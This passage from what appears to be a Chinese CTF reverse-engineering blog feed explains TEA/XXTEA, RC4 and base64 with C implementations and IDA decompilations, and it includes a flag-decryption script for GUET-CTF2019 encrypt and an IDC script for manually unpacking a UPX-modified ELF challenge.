tmp[2] = { 0 };unsigned int sum = 0;unsigned int delta = 0x9e3779b9;for (int i = 0; i &lt; 8; i += 2){tmp[0] = Data[i];tmp[1] = Data[i + 1];sum = delta*32;for (int i = 0; i &lt; 32; ++i){tmp[1] -= ((tmp[0] &lt;&lt; 4) + key[2]) ^ (tmp[0] + sum) ^ ((tmp[0] &gt;&gt; 5) + key[3]);tmp[0] -= ((tmp[1] &lt;&lt; 4) + key[0]) ^ (tmp[1] + sum) ^ ((tmp[1] &gt;&gt; 5) + key[1]);sum -= delta;}Data[i] = tmp[i];Data[i + 1] = tmp[i + 1];}return 0;}</code></pre><p>解密的时候主要是要找到Key和密文，并且可能会有大小端序的问题</p><h1 id="XTea"><a href="#XTea" class="headerlink" title="XTea"></a>XTea</h1><p>Xtea是Tea的升级版，添加了一些移位和异或操作</p><h2 id="加密流程-1"><a href="#加密流程-1" class="headerlink" title="加密流程"></a>加密流程</h2><p> <img src="/2022/02/07/Tea%E3%80%81XTea%E3%80%81XXTea%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/20190112131633-3a396138-1629-1.png"> </p><p>因为加密过程实际上没发生太多变化，就不贴加密和解密的代码了</p><h1 id="XXTea"><a href="#XXTea" class="headerlink" title="XXTea"></a>XXTea</h1><h2 id="加密流程-2"><a href="#加密流程-2" class="headerlink" title="加密流程"></a>加密流程</h2><p> <img src="/2022/02/07/Tea%E3%80%81XTea%E3%80%81XXTea%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/921830_48K7JHRW383FZWR.jpg"> </p><h2 id="加解密代码"><a href="#加解密代码" class="headerlink" title="加解密代码"></a>加解密代码</h2><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9            //固定的一个常量#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))   //固定的运算void btea(uint32_t *v, int n, uint32_t const key[4])   //v是要加密的两个元素的数组{                                                      //n为数组的长度    uint32_t y, z, sum;                                //无符号整型         unsigned p, rounds, e;                                if (n &gt; 1)            /* Coding Part */       {        rounds = 6 + 52/n;               //固定的得出轮数        sum = 0;                                z = v[n-1];                             do        {            sum += DELTA;                //每次进行叠加            e = (sum &gt;&gt; 2) &amp; 3;          //固定运算            for (p=0; p&lt;n-1; p++)                   {                y = v[p+1];                v[p] += MX;                      z = v[p];                             }            y = v[0];            z = v[n-1] += MX;        }        while (--rounds);    }    else if (n &lt; -1)      /* Decoding Part */    {        n = -n;        rounds = 6 + 52/n;        sum = rounds*DELTA;        y = v[0];        do        {            e = (sum &gt;&gt; 2) &amp; 3;            for (p=n-1; p&gt;0; p--)            {                z = v[p-1];                y = v[p] -= MX;            }            z = v[n-1];            y = v[0] -= MX;            sum -= DELTA;        }        while (--rounds);    }} int main(){    uint32_t v[2]= {1,2};    uint32_t const k[4]= {2,2,3,4};    int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密    // v为要加密的数据是两个32位无符号整数  // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位    printf("加密前原始数据：%u %u\n",v[0],v[1]);    btea(v, n, k);    printf("加密后的数据：%u %u\n",v[0],v[1]);    btea(v, -n, k);    printf("解密后的数据：%u %u\n",v[0],v[1]);    return 0;}</code></pre><p>还没实现过，看着流程图不知道怎么入手</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4原理和实现</title>
      <link href="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span> <h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>RC4属于对称密码算法中的流密码加密算法</p><p>密钥长度可变，面向字节操作</p><p>以一个足够大的S表为基础，对表进行非线性变换，产生密钥流</p><p>两次交换过程是为了增加随机性</p><h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><h2 id="初始化S表"><a href="#初始化S表" class="headerlink" title="初始化S表"></a>初始化S表</h2><p>1、对S表进行先行填充，一般为256字节，且为unsigned类型</p><p>2、用种子密钥填充另一个256字节的K表</p><p>如果种子密钥长度不为256，将循环使用种子密钥对K表进行填充</p><p>3、用 K表对S表进行初始置换</p><h3 id="样例展示"><a href="#样例展示" class="headerlink" title="样例展示"></a>样例展示</h3><p>这里我们假设S表和K表都是7个字节的，密钥为345，填充结果如下</p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644168199163.png"></p><p>使用K表对S表进行置换</p><pre class="language-c" data-language="c"><code class="language-c">int j = 0;for (int i = 0; i &lt; 7; ++i){j = (j + S[i] + K[i]) % 7;Swap(S[i], S[j]);}</code></pre><p>得到被置换后的S表</p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644168394862.png"></p><h2 id="生成密钥流"><a href="#生成密钥流" class="headerlink" title="生成密钥流"></a>生成密钥流</h2><p>作用：为每个待价密的字节生成一个伪随机数，用来异或</p><p>注：S表完成初始化之后，种子密钥将不会再被使用</p><p>使用置换后的S表生成密钥流</p><pre class="language-c" data-language="c"><code class="language-c">int i, j = 0;for (int k = 0; k &lt; strlen(raw); ++k){i = (i + 1) % 7;j = (j + S[i]) % 7;Swap(S[i], S[j]);int t = (S[i] + S[j]) % 7;K[k] = S[t];}</code></pre><h1 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h1><p>密钥流和明文进行异或得到密文</p><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><p>加密部分的j是用来打乱的，实现伪随机</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include &lt;string.h&gt;void Rc4_init(unsigned char* S, unsigned char*K,unsigned char* key, unsigned long len){unsigned char  tmp = 0;for (int i = 0; i &lt; 256; ++i){S[i] = i;K[i] = key[i % len];}int j = 0;for (int i = 0; i &lt; 256; ++i){j = (j + S[i] + K[i]) % 256;tmp = S[i];S[i] = S[j];S[j] = tmp;}return;}void Rc4_encrypt(unsigned char* S, unsigned  char* flag,int len){int i = 0, j = 0,t = 0 ;unsigned char key_liu[len] = { 0 };unsigned char tmp = 0;for (unsigned long k = 0; k &lt; len; ++k){i = (i + 1) % 256;j = (j + S[i]) % 256;tmp = S[i];S[i] = S[j];S[j] = tmp;t = (S[i] + S[j]) % 256;key_liu[k] = S[t];}for (int i = 0; i &lt; len; ++i){flag[i] ^= key_liu[i];}}int main(){unsigned char S[256] = { 0 };unsigned char K[256] = { 0 };char flag[512] = { 0xB6, 0x94, 0xFA, 0x8F, 0x3D, 0x5F, 0xB2, 0xE0,0xEA, 0x0F, 0xD2, 0x66, 0x98, 0x6C, 0x9D, 0xE7,0x1B, 0x08, 0x40, 0x71, 0xC5, 0xBE, 0x6F, 0x6D,0x7C, 0x7B, 0x09, 0x8D, 0xA8, 0xBD, 0xF3, 0xF6};char key[] = "w0wy0ugot1t";unsigned long Len = strlen(flag);Rc4_init(S, K,(unsigned char*)key, strlen(key));Rc4_encrypt(S, (unsigned char*)flag, Len);printf("%s", flag);return 0;}</code></pre><p>可以不保存密钥流，直接进行异或，逆向的时候我们可以动调得到密钥流，再与密文进行异或就可以得到明文了</p><pre class="language-c" data-language="c"><code class="language-c">void Rc4_encrypt(unsigned char* S, unsigned  char* flag,char*flag1){int len = strlen(flag1);int i = 0, j = 0,t = 0 ;unsigned char tmp = 0;for (unsigned long k = 0; k &lt; len; ++k){i = (i + 1) % 256;j = (j + S[i]) % 256;tmp = S[i];S[i] = S[j];S[j] = tmp;t = (S[i] + S[j]) % 256;flag[k] ^= S[t];}}</code></pre><p>分别看一下加密过程的逆向代码</p><p>直接异或，动调根据存储的寄存器进行提取</p><pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall Rc4_encrypt(unsigned __int8 *a1, unsigned __int8 *a2, char *a3){  unsigned int v3; // eax  unsigned __int8 v4; // ST2B_1  __int64 result; // rax  unsigned int v6; // [rsp+30h] [rbp-10h]  unsigned int i; // [rsp+34h] [rbp-Ch]  int v8; // [rsp+38h] [rbp-8h]  signed int v9; // [rsp+3Ch] [rbp-4h]  unsigned __int8 *v10; // [rsp+50h] [rbp+10h]  unsigned __int8 *v11; // [rsp+58h] [rbp+18h]  v10 = a1;  v11 = a2;  v6 = strlen(a3);  v9 = 0;  v8 = 0;  for ( i = 0; ; ++i )  {    result = v6;    if ( v6 &lt;= i )      break;    v9 = (unsigned __int8)(((unsigned int)((v9 + 1) &gt;&gt; 31) &gt;&gt; 24) + v9 + 1) - ((unsigned int)((v9 + 1) &gt;&gt; 31) &gt;&gt; 24);    v3 = (unsigned int)((v8 + v10[v9]) &gt;&gt; 31) &gt;&gt; 24;    v8 = (unsigned __int8)(v3 + v8 + v10[v9]) - v3;    v4 = v10[v9];    v10[v9] = v10[v8];    v10[v8] = v4;    v11[i] ^= v10[(unsigned __int8)(v10[v9] + v10[v8])];  }  return result;}</code></pre><p>先保存再异或</p><pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall Rc4_encrypt(unsigned __int8 *a1, unsigned __int8 *a2, signed int a3){  void *v3; // rsp  char *v4; // rax  signed __int64 i; // rdx  unsigned int v6; // eax  __int64 result; // rax  __int64 v8; // [rsp+0h] [rbp-30h]  __int64 *v9; // [rsp+8h] [rbp-28h]  __int64 v10; // [rsp+10h] [rbp-20h]  int v11; // [rsp+1Ch] [rbp-14h]  unsigned int k; // [rsp+20h] [rbp-10h]  unsigned int j; // [rsp+24h] [rbp-Ch]  unsigned int v14; // [rsp+28h] [rbp-8h]  unsigned int v15; // [rsp+2Ch] [rbp-4h]  unsigned __int8 *v16; // [rsp+58h] [rbp+28h]  v16 = a2;  v15 = 0;  v14 = 0;  v11 = 0;  v10 = a3 - 1i64;  v3 = alloca(16 * ((unsigned __int64)(a3 + 15i64) &gt;&gt; 4));  v9 = &amp;v8;  LOBYTE(v8) = 0;  v4 = (char *)&amp;v8 + 1;  for ( i = a3 - 2i64; i != -1; --i )    *v4++ = 0;  HIBYTE(v8) = 0;  for ( j = 0; a3 &gt; j; ++j )  {    v15 = (unsigned __int8)(((unsigned int)((signed int)(v15 + 1) &gt;&gt; 31) &gt;&gt; 24) + v15 + 1)        - ((unsigned int)((signed int)(v15 + 1) &gt;&gt; 31) &gt;&gt; 24);    v6 = (unsigned int)((signed int)(v14 + a1[v15]) &gt;&gt; 31) &gt;&gt; 24;    v14 = (unsigned __int8)(v6 + v14 + a1[v15]) - v6;    HIBYTE(v8) = a1[v15];    a1[v15] = a1[v14];    a1[v14] = HIBYTE(v8);    v11 = (unsigned __int8)(a1[v15] + a1[v14]);    *((_BYTE *)v9 + j) = a1[v11];  }  for ( k = 0; ; ++k )  {    result = k;    if ( (signed int)k &gt;= a3 )      break;    v16[k] ^= *((_BYTE *)v9 + (signed int)k);  }  return result;}</code></pre><p>可以看到密钥流存储在v9，动调之后可以直接提取</p><p>Vs2022生成的exe文件反编译</p><pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall sub_140015E30(__int64 a1, __int64 a2, char *a3){  __int64 result; // rax  __int64 v4; // kr00_8  unsigned __int8 v5; // dl  char v6; // STA4_1  int v7; // edx  unsigned int v8; // [rsp+24h] [rbp+4h]  int v9; // [rsp+44h] [rbp+24h]  int v10; // [rsp+64h] [rbp+44h]  unsigned int i; // [rsp+C4h] [rbp+A4h]  __int64 v12; // [rsp+1C0h] [rbp+1A0h]  __int64 v13; // [rsp+1C8h] [rbp+1A8h]  const char *Str; // [rsp+1D0h] [rbp+1B0h]  Str = a3;  v13 = a2;  v12 = a1;  sub_140011361(&amp;unk_14002200E);  v8 = j_strlen(Str);  v9 = 0;  v10 = 0;  for ( i = 0; ; ++i )  {    result = v8;    if ( i &gt;= v8 )      break;    v4 = v9 + 1;    v9 = (BYTE4(v4) + v9 + 1) - BYTE4(v4);    v5 = (*(v12 + v9) + v10) &gt;&gt; 31;    v10 = (v5 + *(v12 + v9) + v10) - v5;    v6 = *(v12 + v9);    *(v12 + v9) = *(v12 + v10);    *(v12 + v10) = v6;    v7 = (*(v12 + v10) + *(v12 + v9)) &gt;&gt; 31;    *(v13 + i) ^= *(v12 + (v7 + *(v12 + v10) + *(v12 + v9)) - v7);  }  return result;}</code></pre><p>看着跟别的不一样</p><h1 id="题目——BUU-GUET-CTF2019-encrypt"><a href="#题目——BUU-GUET-CTF2019-encrypt" class="headerlink" title="题目——BUU-[GUET-CTF2019]encrypt"></a>题目——BUU-[GUET-CTF2019]encrypt</h1><p>拖进ida，对一些变量和函数名进行识别和改名</p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644325364867.png"></p><p>点进加密函数进行查看</p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644339350075.png"></p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644339358773.png"></p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644339366532.png"></p><p>整体就是先RC4，然后将加密后的三个字符变为四个字符</p><p>逆向过来先将四个字符转为三个字符，然后直接将转换后的结果和密钥流进行异或得到明文</p><p>密钥流可以通过动调得到</p><p><img src="/2022/02/06/RC4%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/1644339479964.png"></p><p>脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){char raw[52]={0x5a,    0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44, 0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56, 0x4C,    0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79, 0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67, 0x4C,    0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70, 0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C, 0x76,    0x5A, 0x45, 0x3D};char decode[39]={0};for(int i=0;i&lt;52;++i){raw[i]-=61;}for(int i=0,i_=0;i&lt;52;i+=4,i_+=3){decode[i_]=((raw[i])&lt;&lt;2)|((raw[i+1])&gt;&gt;4);decode[i_+1]=((raw[i+1]&amp;0xf)&lt;&lt;4)|((raw[i+2]&amp;0x3c)&gt;&gt;2);decode[i_+2]=((raw[i+2]&amp;0xF)&lt;&lt;6)|(raw[i+3]);}char v[90]={0x10,0x59,0x9C,0x92,0x06,0x22,0xCF,0xA5,0x72,0x1E,0x45,0x6A,0x06,0xCB,0x08,0xC3,0xE4,0x49,0x5A,0x63,0x0C,0xDF,0xF6,0x5F,0x08,0x28,0xBD,0xE2,0x10,0x15,0x1F,0x6E,0xAA,0x5A,0xCA,0xEC,0x80,0xAF,0x9B,0x16,0xBB,0x3D,0x13,0x2F,0x6A,0xA4,0xC7,0x2E,0xBC,0x4B,0x60,0x9A,0xAF,0xE9,0xCE,0xDA,0x67,0x39,0xBA,0x3B,0x85,0xEB,0xD2,0x6B,0xAB,0x06,0x6B,0x10,0x57,0x2C,0x88,0x70,0xF7,0x4F,0xAA,0x7F,0x12,0x47,0xD6,0xDE,0x74,0xB2,0x1D,0xA4,0xD7,0x76,0x9A,0xE0};for(int i=0;i&lt;39;++i){decode[i]^=v[i];}printf("%s",decode);return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64实现及细节剖析</title>
      <link href="/2022/02/06/base64%E5%AE%9E%E7%8E%B0%E5%8F%8A%E7%BB%86%E8%8A%82%E5%89%96%E6%9E%90/"/>
      <url>/2022/02/06/base64%E5%AE%9E%E7%8E%B0%E5%8F%8A%E7%BB%86%E8%8A%82%E5%89%96%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include &lt;string.h&gt;char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";void base64_encode(char raw[], char encode[]){int code_len = strlen(raw);int final_len = 0;if (code_len % 3){final_len = (code_len / 3 + 1) * 4;}elsefinal_len = (code_len / 3) * 4;int i = 0, i_ = 0;for (; i &lt; code_len; i += 3, i_ += 4){encode[i_] = base64_table[raw[i] &gt;&gt; 2];encode[i_ + 1] = base64_table[((raw[i] &amp; 0x03) &lt;&lt; 4) | ((raw[i + 1] &amp; 0xf0) &gt;&gt; 4)];encode[i_ + 2] = base64_table[((raw[i + 1] &amp; 0x0f) &lt;&lt; 2) | ((raw[i + 2] &amp; 0xc0) &gt;&gt; 6)];encode[i_ + 3] = base64_table[raw[i + 2] &amp; 0x3f];}if (code_len % 3 == 1){encode[i_ - 1] = '=';encode[i_ - 2] = '=';}else if (code_len % 3 == 2){encode[i_ - 1] = '=';}return;}int Findindex(char c){for (int i = 0; i &lt; strlen(base64_table); ++i){if (c == base64_table[i])return i;}}void base64_decode(char* encode, char* decode){int decode_len=0;int encode_len = strlen(encode);if (strstr(encode, "=="))decode_len = (encode_len / 4) * 3 - 2;else if (strstr(encode, "="))decode_len = (encode_len / 4) * 3 - 1;elsedecode_len = (encode_len / 4) * 3;int i = 0, i_ = 0;for (; i &lt; encode_len; i_ += 4, i += 3){decode[i] = (Findindex(encode[i_]) &lt;&lt; 2) | (Findindex(encode[i_ + 1]) &amp; 0x30) &gt;&gt; 4;decode[i + 1] = ((Findindex(encode[i_ + 1]) &amp; 0xf) &lt;&lt; 4) | ((Findindex(encode[i_ + 2]) &amp; 0x3c) &gt;&gt; 2);decode[i + 2] = ((Findindex(encode[i_ + 2]) &amp; 0x3) &lt;&lt; 6) | ((Findindex(encode[i_ + 3])));}decode[decode_len] = 0;return;}int main(){char raw[] = "hgame{123456}";char encode[100] = { 0 };char decode[100] = { 0 };base64_encode(raw, encode);printf("%s", encode);base64_decode(encode, decode);printf("\n%s", decode);}</code></pre><h1 id="细节剖析"><a href="#细节剖析" class="headerlink" title="细节剖析"></a>细节剖析</h1><h2 id="编码部分"><a href="#编码部分" class="headerlink" title="编码部分"></a>编码部分</h2><h3 id="记录长度"><a href="#记录长度" class="headerlink" title="记录长度"></a>记录长度</h3><p>首先要先计算长度，base64就是将三个字节扩展为四个字节，所以要分成有余数和整除两种情况</p><pre class="language-c" data-language="c"><code class="language-c">int code_len = strlen(raw);int final_len = 0;if (code_len % 3){final_len = (code_len / 3 + 1) * 4;}elsefinal_len = (code_len / 3) * 4;</code></pre><h3 id="编码部分-1"><a href="#编码部分-1" class="headerlink" title="编码部分"></a>编码部分</h3><p>首先先介绍一下两个工具，&amp;和|，和一些数据做&amp;运算可以取到我们想要的位，而|运算可以将两部分结合在一起</p><p>编码后的索引最多为六位，原先的数据可以是八位的</p><h4 id="encode-i"><a href="#encode-i" class="headerlink" title="encode[i]"></a>encode[i]</h4><p>这个其实是最好实现的，因为只需要取到前六位，所以直接&gt;&gt;2就可以实现</p><pre class="language-c" data-language="c"><code class="language-c">encode[i_] = base64_table[raw[i] &gt;&gt; 2];</code></pre><h4 id="encode-i-1"><a href="#encode-i-1" class="headerlink" title="encode[i+1]"></a>encode[i+1]</h4><p>先明确我们的需求，从第一个数据获取最后的两位与第二个数据获取的前四位结合。需要用到&amp;，这里的结合就需要用到|。</p><p>首先要保证我们取到的是两位的，需要&amp;0x03</p><table><thead><tr><th>0</th><th>0</th><th>0</th><th>0</th><th>0</th><th>0</th><th>0</th><th>1</th><th>1</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>因为只有最后两位是1，根据按位&amp;，当有一个是0时运算后结果必定为0，所以就可以取到最后两位</p><p>下一步是移到正确的位置，需要用到位移运算符</p><p>这里第一个数的最后两位编码后是放在前面两位的位置，所以需要&lt;&lt;4</p><p>接下来取剩余的四位</p><p>剩余的四位来自第二个数的前四位</p><p>可以先&amp;0xf0使得后四位都为0，当然也可以不用，直接&gt;&gt;4</p><p>最后使用|结合起来</p><table><thead><tr><th>0</th><th>0</th><th>0</th><th>1</th><th>1</th><th>0</th><th>0</th><th>1</th><th>1</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td>与</td><td>运</td><td>算</td><td></td></tr><tr><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><pre class="language-c" data-language="c"><code class="language-c">encode[i_ + 1] = base64_table[((raw[i] &amp; 0x03) &lt;&lt; 4) | ((raw[i + 1]) &gt;&gt; 4)];</code></pre><h4 id="encode-i-2"><a href="#encode-i-2" class="headerlink" title="encode[i+2]"></a>encode[i+2]</h4><p>要用到第二个数据的后四位和第三个数据的前两位</p><p>同理，要保留第二个数据的后四位并且去除前四位，就需要&amp;0xf，移到正确的位置&lt;&lt;2，剩余两位留给第三个数据的前两位</p><p>要取到第三个数据的前两位</p><p>可以直接&gt;&gt;6保证前两位移动到最后的两位，也可以先用&amp;0xc0清除后四位，因为是00110000，最后结合起来就可以了</p><pre class="language-c" data-language="c"><code class="language-c">encode[i_ + 2] = base64_table[((raw[i + 1] &amp; 0x0f) &lt;&lt; 2) | ((raw[i + 2] ) &gt;&gt; 6)];</code></pre><h4 id="encode-i-3"><a href="#encode-i-3" class="headerlink" title="encode[i+3]"></a>encode[i+3]</h4><p>只需要取到第三个数据的后六位就可以了</p><p>直接&amp;0x3f，因为0x3f的二进制是00111111</p><pre class="language-c" data-language="c"><code class="language-c">encode[i_ + 3] = base64_table[raw[i + 2] &amp; 0x3f];</code></pre><h4 id="填加"><a href="#填加" class="headerlink" title="填加="></a>填加=</h4><p>如果编码前的数据长度%3不等于0，需要使用=填充</p><p>如果多出一位的话，根据经过上述过程会变成两位，所以最后两位需要用到=来填充</p><p>多出两位，经过上述过程变成三位，所以只需填充最后一位为=</p><pre class="language-c" data-language="c"><code class="language-c">if (code_len % 3 == 1){encode[i_ - 1] = '=';encode[i_ - 2] = '=';}else if (code_len % 3 == 2){encode[i_ - 1] = '=';}</code></pre><h3 id="解码部分"><a href="#解码部分" class="headerlink" title="解码部分"></a>解码部分</h3><p>六位还原为八位</p><h4 id="去除"><a href="#去除" class="headerlink" title="去除="></a>去除=</h4><p>先计算解码后的长度，每四个对应三个，最后减去=的长度</p><pre class="language-c" data-language="c"><code class="language-c">int decode_len=0;int encode_len = strlen(encode);if (strstr(encode, "=="))decode_len = (encode_len / 4) * 3 - 2;else if (strstr(encode, "="))decode_len = (encode_len / 4) * 3 - 1;elsedecode_len = (encode_len / 4) * 3;</code></pre><h4 id="decode-i"><a href="#decode-i" class="headerlink" title="decode[i]"></a>decode[i]</h4><p>其实和上面过程正好相反，取第一个编码数据的后六位（因为前两位是填充的0）和第二个编码数据的前两位，在此之前需要先去除前两位填充的0，所以要&amp;0x30，根据上面的过程，我们需要的是00110000，正好是0x30</p><p>再用|结合</p><pre class="language-c" data-language="c"><code class="language-c">decode[i] = (Findindex(encode[i_]) &lt;&lt; 2) | (Findindex(encode[i_ + 1]) &amp; 0x30) &gt;&gt; 4;</code></pre><h4 id="decode-i-1"><a href="#decode-i-1" class="headerlink" title="decode[i+1]"></a>decode[i+1]</h4><p>需要第二个编码数据的后四位和第三个编码数据的前四位，也是需要先去除填充的0</p><p>所以第二个数据&amp;0xf保证取到后四位，&lt;&lt;4移到前四位</p><p>第三个数据&amp;0x3c（00111100）进行去除填充的前两位0以及取到需要的那四位，再&gt;&gt;2，最后使用|结合</p><pre class="language-c" data-language="c"><code class="language-c">decode[i + 1] = ((Findindex(encode[i_ + 1]) &amp; 0xf) &lt;&lt; 4) | ((Findindex(encode[i_ + 2]) &amp; 0x3c) &gt;&gt; 2);</code></pre><h4 id="decode-i-2"><a href="#decode-i-2" class="headerlink" title="decode[i+2]"></a>decode[i+2]</h4><p>第三个编码数据的后两位和第四个编码数据的那六位</p><p>和上述过程类似，就不赘述了</p><h4 id="字符数组结束"><a href="#字符数组结束" class="headerlink" title="字符数组结束"></a>字符数组结束</h4><p>最后记得填加字符数组结束符</p><pre class="language-c" data-language="c"><code class="language-c">decode[decode_len] = 0;</code></pre><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>base64还可以魔改，进行变表操作或者在编码过程中参杂异或（Dasctf2022）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件手脱upx变形壳</title>
      <link href="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/"/>
      <url>/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="题目-hgame2022-week2-upx-magic1"><a href="#题目-hgame2022-week2-upx-magic1" class="headerlink" title="题目-hgame2022-week2-upx magic1"></a>题目-hgame2022-week2-upx magic1</h1><p>发现命令行脱壳没用，只能手脱，elf文件没办法使用esp定律，ida手脱</p><p>进入ida</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643878891388.png"></p><p>在第一个call下断点，进行动态调试</p><p>F7单步进入</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879064585.png"></p><p>到了第二个call再次F7进入</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879092434.png"></p><p>一路f8</p><p>retn后到</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879119459.png"></p><p>F7进入</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879160619.png"></p><p>有三个向上的跳转</p><p>在第三个跳转之后F4</p><p>一直F8到达程序真正的入口点</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879196863.png"></p><p>此时需要dumpfile</p><p>ALT+F7运行脚本，脚本需要修改后缀为idc</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;idc.idc&gt;#define PT_LOAD              1#define PT_DYNAMIC           2static main(void){         auto ImageBase,StartImg,EndImg;         auto e_phoff;         auto e_phnum,p_offset;         auto i,dumpfile;         ImageBase=0x400000;         StartImg=0x400000;         EndImg=0x0;         if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )  {    if(dumpfile=fopen("D:\\dumpfile2","wb"))//这路可以更改路径    {      e_phoff=ImageBase+Qword(ImageBase+0x20);      Message("e_phoff = 0x%x\n", e_phoff);      e_phnum=Word(ImageBase+0x38);      Message("e_phnum = 0x%x\n", e_phnum);      for(i=0;i&lt;e_phnum;i++)      {         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)                         {                                  p_offset=Qword(e_phoff+0x8);                                 StartImg=Qword(e_phoff+0x10);                                 EndImg=StartImg+Qword(e_phoff+0x28);                                 Message("start = 0x%x, end = 0x%x, offset = 0x%x\n", StartImg, EndImg, p_offset);                                 dump(dumpfile,StartImg,EndImg,p_offset);                                 Message("dump segment %d ok.\n",i);                         }             e_phoff=e_phoff+0x38;      }      fseek(dumpfile,0x3c,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fseek(dumpfile,0x28,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fclose(dumpfile);        }else Message("dump err."); }}static dump(dumpfile,startimg,endimg,offset) {        auto i;        auto size;        size=endimg-startimg;        fseek(dumpfile,offset,0);        for ( i=0; i &lt; size; i=i+1 )         {        fputc(Byte(startimg+i),dumpfile);        }}</code></pre><p>得到dumpfile2，拖进ida得到正常的代码</p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1643879324566.png"></p><h3 id="爆破脚本"><a href="#爆破脚本" class="headerlink" 